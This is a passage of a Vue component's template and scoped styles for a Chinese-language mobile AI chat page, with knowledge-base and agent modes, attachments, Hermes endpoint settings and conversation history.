          {{ agentEngine === 'hermes'
            ? (agentEndpoint ? '已连接 Hermes Agent：具备记忆、工具与技能，可执行多步任务' : 'Hermes 引擎未配置端点，点右上角 ⚙ 填写')
            : '本地引擎（默认）：用平台已配置的 AI 模型 + 本地工具（检索知识库 / 读文档），无需额外配置' }}
        </div>
        <div class="aic-empty-tip" v-else>
          {{ mode === 'general' ? '不检索知识库，直接凭通用知识作答' : '基于知识库检索作答，也能陪你日常聊聊' }}
        </div>
        <div class="aic-sugs">
          <button v-for="s in sugs" :key="s" class="aic-sug" @click="send(s)">{{ s }}</button>
        </div>
      </div>

      <div v-for="(m, i) in messages" :key="i" class="aic-msg" :class="m.role">
        <div class="aic-av">
          <span v-if="m.role === 'user'" class="aic-av-u">{{ userInitial }}</span>
          <span v-else class="aic-av-a"><el-icon><MagicStick /></el-icon></span>
        </div>
        <div class="aic-bubble">
          <div v-if="m.role === 'ai'" class="aic-md" v-html="renderMarkdown(m.content)"></div>
          <div v-else class="aic-text">
            <div v-if="m.files && m.files.length" class="aic-files">
              <span v-for="f in m.files" :key="f" class="aic-file-chip">📎 {{ f }}</span>
            </div>
            {{ m.content }}
          </div>

          <div v-if="m.sources && m.sources.length" class="aic-src">
            <div class="aic-src-h">引用来源（{{ m.sources.length }}）</div>
            <span v-for="(s, si) in m.sources" :key="si" class="aic-src-chip">{{ s.title || s.docTitle || '文档' }}</span>
          </div>
          <div v-if="m.steps && m.steps.length" class="aic-steps">
            <div v-for="(st, si) in m.steps" :key="si" class="aic-step-row">{{ st }}</div>
          </div>
          <div v-if="m.meta && (m.meta.name || m.meta.latencyMs)" class="aic-meta">
            {{ m.meta.name }}<span v-if="m.meta.latencyMs"> · {{ fmtMs(m.meta.latencyMs) }}</span>
          </div>
        </div>
      </div>

      <div v-if="loading" class="aic-msg ai">
        <div class="aic-av"><span class="aic-av-a"><el-icon><MagicStick /></el-icon></span></div>
        <div class="aic-bubble aic-typing"><i /><i /><i />
          <div v-if="agentSteps.length" class="aic-steps">
            <div class="aic-steps-head" @click="agentStepsOpen = !agentStepsOpen">
              <span>执行过程（{{ agentSteps.length }} 步）</span>
              <span class="aic-steps-toggle">{{ agentStepsOpen ? '收起' : '展开' }}</span>
            </div>
            <div v-show="agentStepsOpen" class="aic-steps-list">
              <div v-for="(s, i) in agentSteps" :key="i" class="aic-step-row">
                <span class="aic-step-dot"></span><span class="aic-step-txt">{{ s }}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div style="height:8px"></div>
    </div>

    <div class="aic-atts" v-if="attachments.length">
      <span v-for="a in attachments" :key="a.id" class="aic-att" :title="a.name">
        {{ a.kind === 'image' ? (a.mode === 'vision' ? '🖼' : '📝') : '📄' }} {{ a.name.length > 12 ? a.name.slice(0, 11) + '…' : a.name }}
        <button v-if="a.kind === 'image'" type="button" class="aic-att-mode"
          :title="a.mode === 'vision' ? '当前：直接给模型看图。点击改为本地 OCR 识别文字（离线可用）' : '当前：本地 OCR 识别文字。点击改回直接看图'"
          @click="toggleAttMode(a.id)">{{ a.mode === 'vision' ? '看图' : '识文' }}</button>
        <button class="aic-att-x" @click="removeAttachment(a.id)">×</button>
      </span>
    </div>
    <div class="aic-input">
      <input ref="fileInput" type="file" multiple hidden
             accept="image/*,.pdf,.docx,.pptx,.xlsx,.txt,.md,.markdown,.json,.csv,.log,.xml,.yml,.yaml,.sql,.ts,.js,.py,.java,.html,.css,.vue,.ini,.conf,.properties"
             @change="onFilesPicked" />
      <button class="aic-clip" :disabled="loading || attBusy" @click="pickFiles" aria-label="上传附件">
        <el-icon :size="18"><Paperclip /></el-icon>
      </button>
      <textarea
        v-model="input" rows="1" class="aic-ta"
        :placeholder="mode === 'agent' ? '给 Agent 派活…' : '问点什么…'" @keydown.enter.exact.prevent="send()"
      ></textarea>
      <button v-if="loading" class="aic-send stop" @click="stopAi">停止</button>
      <button v-else class="aic-send" :disabled="!input.trim()" @click="send()">
        <el-icon><Promotion /></el-icon>
      </button>
    </div>

    <!-- Agent 询问用户：给选项点选，也可以自己输入 -->
    <div v-if="agentAsk" class="aic-mask" @click.self="answerAgentAsk('')">
      <div class="aic-sheet" @click.stop>
        <div class="aic-sheet-h"><span>Agent 想跟你确认</span></div>
        <div class="aic-ask">
          <p class="aic-ask-q">{{ agentAsk.question }}</p>
          <div v-if="agentAsk.options.length" class="aic-ask-opts">
            <button
              v-for="(o, i) in agentAsk.options" :key="i"
              class="aic-ask-opt" @click="answerAgentAsk(o)"
            >{{ o }}</button>
          </div>
          <div class="aic-ask-custom">
            <input
              v-model="agentAskInput" class="aic-ask-i"
              placeholder="也可以自己输入…" @keyup.enter="answerAgentAsk()"
            />
            <button class="aic-ask-send" @click="answerAgentAsk()">确定</button>
          </div>
        </div>
      </div>
    </div>

    <!-- Agent 设置：端点 + Key -->
    <div v-if="agentOpen" class="aic-mask" @click.self="agentOpen = false">
      <div class="aic-sheet" @click.stop>
        <div class="aic-sheet-h"><span>Agent 设置</span></div>
        <div class="aic-cfg-form">
          <label class="aic-cfg-l">Agent 引擎</label>
          <div class="aic-cfg-eng">
            <button :class="{ on: agentEngine === 'local' }" @click="agentEngine = 'local'">手机本地（推荐）</button>
            <button :class="{ on: agentEngine === 'hermes' }" @click="agentEngine = 'hermes'">Hermes 实例</button>
          </div>
          <p class="aic-cfg-tip" v-if="agentEngine === 'local'">本地引擎：AI 在手机上自主检索知识库、读取文档后作答，零配置开箱即用。</p>
          <template v-if="agentEngine === 'hermes'">
          <label class="aic-cfg-l">Hermes 端点（OpenAI 兼容）</label>
          <input v-model="agentEndpoint" class="aic-cfg-i" placeholder="http://192.168.1.10:8642/v1"
                 autocapitalize="off" autocomplete="off" spellcheck="false" />
          <label class="aic-cfg-l">API Key（未设可留空）</label>
          <input v-model="agentKey" class="aic-cfg-i" placeholder="API_SERVER_KEY" type="password"
                 autocomplete="off" />
          <p class="aic-cfg-tip">在自建 Hermes 上启用 API Server：<br/>
            ~/.hermes/.env 里 API_SERVER_ENABLED=true，然后 hermes gateway。<br/>
            端点与 Key 只保存在本机，不会上传。</p>
          </template>
          <button class="aic-cfg-save" @click="saveAgentCfg">保存</button>
        </div>
      </div>
    </div>

    <div v-if="historyOpen" class="aic-mask" @click="historyOpen = false">
      <div class="aic-sheet" @click.stop>
        <div class="aic-sheet-h">
          <span>历史会话</span>
          <button class="aic-sheet-new" @click="newConversation"><el-icon><Plus /></el-icon> 新建</button>
        </div>
        <div class="aic-sheet-list">
          <div v-if="!conversations.length" class="aic-sheet-empty">还没有会话</div>
          <div
            v-for="c in conversations" :key="c.id" class="aic-sheet-row"
            :class="{ on: c.id === currentId }" @click="selectConversation(c.id)"
          >
            <span class="aic-sheet-title">{{ c.title || '新对话' }}</span>
            <button class="aic-sheet-del" @click.stop="removeConversation(c.id)"><el-icon><Delete /></el-icon></button>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
.aic {
  display: flex; flex-direction: column;
  /* ⚠️ 不用 height:100%：父级 .m-view 是 overflow-y:auto 的 flex item，其内百分比高度
     在部分 WebView 上会退化为「内容高度」——空态下输入条悬在半空、下方露出一段背景
     （2026-10-07 真机截图）。直接用视口高度减 TabBar（58px + safe-area，与 MobileApp.tabbar 对应），
     键盘弹起时 dvh 自动收缩，输入条跟随上移。 */
  height: calc(100dvh - 58px - env(safe-area-inset-bottom));
  background: var(--m-bg);
}
.aic-head {
  flex: none; display: flex; align-items: center; gap: 4px;
  padding: calc(env(safe-area-inset-top) + 8px) 8px 8px;
  background: var(--m-bg);
}
.aic-title { flex: 1 1 auto; text-align: center; font-size: 16.5px; font-weight: 600; }

.aic-bar {
  flex: none; display: flex; align-items: center; gap: 10px;
  padding: 6px 16px 10px;
}
.aic-seg {
  display: flex; gap: 2px; padding: 3px;
  background: var(--m-card); border-radius: 11px; box-shadow: var(--m-shadow);
}
.aic-seg button {
  border: none; background: transparent; cursor: pointer;
  padding: 6px 14px; border-radius: 9px;
  font-size: 13.5px; font-weight: 600; color: var(--m-text-sub);
}
.aic-seg button.on { background: var(--m-primary); color: #fff; }
.aic-model {
  flex: 1 1 auto; min-width: 0; height: 34px;
  border: 1px solid var(--m-border); border-radius: 11px;
  background: var(--m-card); color: var(--m-text);
  font-size: 13px; padding: 0 8px;
}

.aic-body {
  flex: 1 1 auto; min-height: 0; overflow-y: auto; -webkit-overflow-scrolling: touch;
  padding: 6px 14px 0;
}

.aic-empty { text-align: center; padding: 34px 12px 20px; }
.aic-empty-ico {
  width: 54px; height: 54px; margin: 0 auto 14px; border-radius: 50%;
  background: var(--m-primary-soft); color: var(--m-primary);
  display: inline-flex; align-items: center; justify-content: center;
}
.aic-empty-title { font-size: 17px; font-weight: 700; color: var(--m-text); }
.aic-empty-tip { font-size: 13px; color: var(--m-text-dim); margin-top: 5px; }
.aic-sugs { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin-top: 18px; }
.aic-sug {
  border: 1px solid var(--m-border); background: var(--m-card);
  color: var(--m-text); border-radius: 14px;
  padding: 8px 13px; font-size: 13px; cursor: pointer;
}
.aic-sug:active { background: var(--m-card-2); }

.aic-msg { display: flex; gap: 8px; margin-bottom: 14px; align-items: flex-start; }
.aic-msg.user { flex-direction: row-reverse; }
.aic-av { flex: none; width: 30px; height: 30px; }
.aic-av-u, .aic-av-a {
  width: 30px; height: 30px; border-radius: 50%;
  display: inline-flex; align-items: center; justify-content: center;
  font-size: 13px; font-weight: 700; color: #fff;
}
.aic-av-u { background: var(--m-primary); }
.aic-av-a { background: var(--m-success); }

.aic-bubble {
  max-width: calc(100% - 46px);
  background: var(--m-card); border-radius: 14px;
  padding: 10px 13px; box-shadow: var(--m-shadow);
  font-size: 14.5px; line-height: 1.65; color: var(--m-text);
  word-break: break-word; overflow-wrap: anywhere;
}
.aic-msg.user .aic-bubble { background: var(--m-primary); color: #fff; }
.aic-text { white-space: pre-wrap; }

/* Markdown 正文：移动端字号收紧、代码块横向滚动、表格不撑破屏幕 */
.aic-md :deep(p) { margin: 0 0 8px; }
.aic-md :deep(p:last-child) { margin-bottom: 0; }
.aic-md :deep(pre) {
  background: rgba(0, 0, 0, .06); border-radius: 9px;
  padding: 10px; overflow-x: auto; margin: 8px 0;
}
html.dark .aic-md :deep(pre) { background: rgba(255, 255, 255, .08); }
.aic-md :deep(code) { font-size: 13px; }
.aic-md :deep(ul), .aic-md :deep(ol) { padding-left: 20px; margin: 6px 0; }
.aic-md :deep(a) { color: var(--m-primary); }
.aic-md :deep(table) { display: block; overflow-x: auto; max-width: 100%; }
.aic-md :deep(blockquote) {
  margin: 8px 0; padding-left: 10px;
  border-left: 3px solid var(--m-border); color: var(--m-text-sub);
}

.aic-src { margin-top: 9px; border-top: 1px solid var(--m-border); padding-top: 8px; }
.aic-src-h { font-size: 12px; font-weight: 600; color: var(--m-text-dim); margin-bottom: 6px; }
.aic-src-chip {
  display: inline-block; margin: 0 6px 6px 0; padding: 4px 9px;
  background: var(--m-card-2); border-radius: 9px;
  font-size: 12px; color: var(--m-text-sub);
}
.aic-meta { margin-top: 7px; font-size: 11.5px; color: var(--m-text-dim); }

.aic-typing { display: inline-flex; gap: 5px; align-items: center; padding: 13px; }
.aic-typing i {
  width: 7px; height: 7px; border-radius: 50%; background: var(--m-text-dim);
  animation: aicBlink 1.2s infinite ease-in-out;
}
.aic-typing i:nth-child(2) { animation-delay: .2s; }
.aic-typing i:nth-child(3) { animation-delay: .4s; }
@keyframes aicBlink { 0%, 80%, 100% { opacity: .25; } 40% { opacity: 1; } }

/* 附件 chips（输入条上方一行） */
.aic-atts {
  flex: none; display: flex; gap: 6px; flex-wrap: wrap;
  padding: 6px 14px 0; background: var(--m-bg);
}
.aic-att {
  display: inline-flex; align-items: center; gap: 4px;
  font-size: 12px; color: var(--m-text);
  background: var(--m-card); border: 1px solid var(--m-border);
  border-radius: 6px; padding: 3px 8px; max-width: 46%;
  overflow: hidden; white-space: nowrap; text-overflow: ellipsis;
}
.aic-att-x { border: none; background: transparent; color: var(--m-text-dim); font-size: 14px; padding: 0 2px; cursor: pointer; }
.aic-att-mode {
  border: none; cursor: pointer; padding: 1px 6px; border-radius: 6px;
  background: rgba(22,119,255,.12); color: #0958d9; font-size: 11px; line-height: 1.4;
}
html.dark .aic-att-mode { background: rgba(76,141,255,.2); color: #9cc6ff; }

/* Agent 步骤列表（累积展示，可折叠） */
.aic-steps { margin-top: 6px; }
.aic-steps-head {
  display: inline-flex; align-items: center; gap: 8px; cursor: pointer;
  font-size: 12.5px; color: var(--m-text-dim); user-select: none;
}
.aic-steps-toggle { font-size: 12px; color: #1677ff; }
.aic-steps-list { margin-top: 6px; display: flex; flex-direction: column; gap: 5px; }
.aic-step-row { display: flex; align-items: flex-start; gap: 7px; font-size: 12.5px; color: var(--m-text-dim); line-height: 1.5; }
.aic-step-dot { flex: none; width: 5px; height: 5px; border-radius: 50%; background: #1677ff; margin-top: 7px; }
.aic-step-txt { flex: 1 1 auto; word-break: break-word; }

/* Agent 询问弹层 */
.aic-ask { padding: 4px 2px 2px; }
.aic-ask-q { margin: 0 0 14px; font-size: 14px; line-height: 1.65; color: var(--m-text); }
.aic-ask-opts { display: flex; flex-direction: column; gap: 8px; margin-bottom: 12px; }
.aic-ask-opt {
  text-align: left; border: 1px solid var(--m-border); background: var(--m-bg);
  color: var(--m-text); font-size: 13.5px; padding: 11px 14px; border-radius: 10px; cursor: pointer;
  transition: all .16s;
}
.aic-ask-opt:hover, .aic-ask-opt:active { border-color: #1677ff; color: #1677ff; background: rgba(22,119,255,.06); }
.aic-ask-custom { display: flex; gap: 8px; }
.aic-ask-i {
  flex: 1 1 auto; border: 1px solid var(--m-border); border-radius: 10px;
  background: var(--m-bg); color: var(--m-text); font-size: 14px; padding: 10px 12px; outline: none;
}
.aic-ask-i:focus { border-color: #1677ff; }
.aic-ask-send {
  flex: none; border: none; border-radius: 10px; background: #1677ff; color: #fff;
  font-size: 14px; padding: 0 18px; cursor: pointer;
}

/* 📎 按钮 */
.aic-clip {
  flex: none; width: 40px; height: 40px; border-radius: 12px;
  border: 1px solid var(--m-border); background: var(--m-card); color: var(--m-text-dim);
  display: inline-flex; align-items: center; justify-content: center; cursor: pointer;
}
.aic-clip:active { color: var(--m-primary); border-color: var(--m-primary); }

/* Agent 设置按钮 */
.aic-cfg {
  flex: none; width: 32px; height: 32px; border-radius: 8px;
  border: 1px solid var(--m-border); background: var(--m-card); color: var(--m-text-dim);
  display: inline-flex; align-items: center; justify-content: center; cursor: pointer;
}
.aic-cfg-form { padding: 4px 2px; }
.aic-cfg-l { display: block; font-size: 12.5px; color: var(--m-text-dim); margin: 10px 2px 6px; }
.aic-cfg-i {
  width: 100%; box-sizing: border-box; height: 42px;
  border: 1px solid var(--m-border); border-radius: 8px;
  background: var(--m-card-2, var(--m-card)); color: var(--m-text);
  padding: 0 12px; font-size: 15px;
}
.aic-cfg-tip { font-size: 11.5px; color: var(--m-text-dim); line-height: 1.7; margin: 10px 0 0; }
.aic-cfg-save {
  width: 100%; height: 42px; margin-top: 14px;
  border: none; border-radius: 8px; background: var(--m-primary); color: #fff;
  font-size: 15px; cursor: pointer;
}

/* Agent 步骤 */
.aic-step { font-size: 12px; color: var(--m-text-dim); margin-left: 8px; }
.aic-steps { margin-top: 8px; border-top: 1px dashed var(--m-border); padding-top: 6px; }
.aic-step-row { font-size: 11.5px; color: var(--m-text-dim); line-height: 1.8; }
.aic-cfg-eng { display: flex; gap: 8px; }
.aic-cfg-eng button {
  flex: 1; height: 38px; border-radius: 8px;
  border: 1px solid var(--m-border); background: var(--m-card-2, var(--m-card));
  color: var(--m-text-dim); font-size: 13.5px; cursor: pointer;
}
.aic-cfg-eng button.on { color: var(--m-primary); border-color: var(--m-primary); background: var(--m-primary-soft, var(--m-card)); font-weight: 600; }

/* 用户消息附件标记 */
.aic-files { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 6px; }
.aic-file-chip {
  font-size: 11.5px; background: rgba(255,255,255,.16);
  border-radius: 5px; padding: 2px 7px;
}

/* 底部输入条：安全区由 TabBar 统一兜底（TabBar 自带 padding-bottom: safe-area），
   这里不再叠加 env(safe-area-inset-bottom)，否则输入条被垫高、输入框显得偏上。 */
.aic-input {
  flex: none; display: flex; align-items: flex-end; gap: 8px;
  padding: 8px 14px;
  background: var(--m-bg); border-top: 1px solid var(--m-border);
}
.aic-ta {
  flex: 1 1 auto; min-width: 0; max-height: 96px; min-height: 40px;
  border: 1px solid var(--m-border); border-radius: 12px;
  background: var(--m-card); color: var(--m-text);
  padding: 10px 12px; font-size: 15px; line-height: 1.4;
  resize: none; outline: none;
}
.aic-send {
  flex: none; width: 44px; height: 40px; border: none; border-radius: 12px;
  background: var(--m-primary); color: #fff; cursor: pointer;
  display: inline-flex; align-items: center; justify-content: center;
}
.aic-send:disabled { opacity: .45; }
.aic-send.stop { background: var(--m-danger); width: 56px; font-size: 13.5px; }

.aic-mask {
  position: fixed; inset: 0; z-index: 60;
  background: rgba(0, 0, 0, .45);
  display: flex; align-items: flex-end;
}
.aic-sheet {
  width: 100%; max-height: 62%;
  background: var(--m-bg); border-radius: 18px 18px 0 0;
  display: flex; flex-direction: column;
  padding-bottom: env(safe-area-inset-bottom);
}
.aic-sheet-h {
  flex: none; display: flex; align-items: center; justify-content: space-between;
  padding: 14px 16px 10px; font-size: 15.5px; font-weight: 700;
  border-bottom: 1px solid var(--m-border);
}
.aic-sheet-new {
  border: none; background: transparent; color: var(--m-primary);
  font-size: 13.5px; font-weight: 600; cursor: pointer;
  display: inline-flex; align-items: center; gap: 3px;
}
.aic-sheet-list { flex: 1 1 auto; overflow-y: auto; padding: 6px 12px 12px; }
.aic-sheet-empty { text-align: center; color: var(--m-text-dim); font-size: 13px; padding: 22px 0; }
.aic-sheet-row {
  display: flex; align-items: center; gap: 8px;
  padding: 12px 10px; border-radius: 11px; cursor: pointer;
}
.aic-sheet-row.on { background: var(--m-card-2); }
.aic-sheet-title {
  flex: 1 1 auto; min-width: 0; font-size: 14.5px; color: var(--m-text);
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
.aic-sheet-del {
  flex: none; border: none; background: transparent;
  color: var(--m-text-dim); cursor: pointer;
  display: inline-flex; align-items: center;
}
</style>
